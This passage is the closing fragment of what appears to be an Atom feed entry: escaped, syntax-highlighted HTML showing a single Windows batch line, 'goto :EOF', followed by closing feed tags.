    &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nl"&gt;EOF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content></entry></feed>